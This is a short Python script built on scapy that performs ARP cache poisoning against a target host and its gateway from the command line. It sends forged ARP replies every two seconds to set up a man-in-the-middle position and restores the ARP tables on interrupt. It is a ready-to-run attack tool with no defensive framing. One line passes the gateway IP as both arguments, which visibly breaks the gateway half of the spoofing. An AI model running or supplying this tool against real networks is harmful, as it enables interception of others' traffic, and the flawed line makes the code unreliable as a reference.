# -*- coding: utf-8 -*-
"""
Created on Fri Sep 16 02:19:54 2022

@author:
"""

import scapy.all as scapy
import time
import sys
import argparse


def get_ip():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="Specify the target's IP address")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Specify the gateway's IP address")
    options = parser.parse_args()
    
    if not options.target_ip:
        parser.error("[-] Specify an IP address for the target. --help for more info")
    elif not options.gateway_ip:
        parser.error("[-] Specify an IP address for the gateway, --help for more info")
    return options

def get_mac(ip):
    arp_header = scapy.ARP(pdst=ip)
    ether_header = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_packet = ether_header / arp_header
    answered_list = scapy.srp(arp_request_packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc 

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)
    
options = get_ip()

try:
    sent_packet_count = 0
    while True:
        spoof(options.target_ip, options.gateway_ip)
        spoof(options.gateway_ip, options.gateway_ip)
        sent_packet_count = sent_packet_count + 2
        print ("\r[+] Packet sent:" + str(sent_packet_count))
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print ("\n[+] Detected CTRL + C ... Restoring ARP tables ... Please wait/")
    restore(options.target_ip, options.gateway_ip)
    restore(options.gateway_ip, options.target_ip)
    
        
        
